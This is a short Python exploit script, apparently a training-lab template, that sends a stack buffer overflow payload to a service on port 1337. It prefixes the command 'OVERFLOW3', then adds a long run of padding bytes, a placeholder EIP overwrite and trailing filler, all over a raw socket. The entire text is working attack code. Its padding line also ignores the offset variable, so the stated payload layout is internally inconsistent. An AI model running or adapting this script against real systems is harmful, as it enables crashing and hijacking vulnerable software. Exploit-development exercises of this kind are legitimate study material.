#!/usr/bin/env python3

import socket

host, port = "10.10.154.224", 1337 # CHANGE THIS.

command = b"OVERFLOW3 " # CHANGE THIS.
length = 1500 # CHANGE THIS.
offset = 1274 # CHANGE THIS.
new_eip = b"BBBB"

payload = b"".join(
	[
		command,
		b"A" * 1500, # CHANGE THIS.
		new_eip,
		b"C" * ( length - len(new_eip) - offset),
	]
)

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)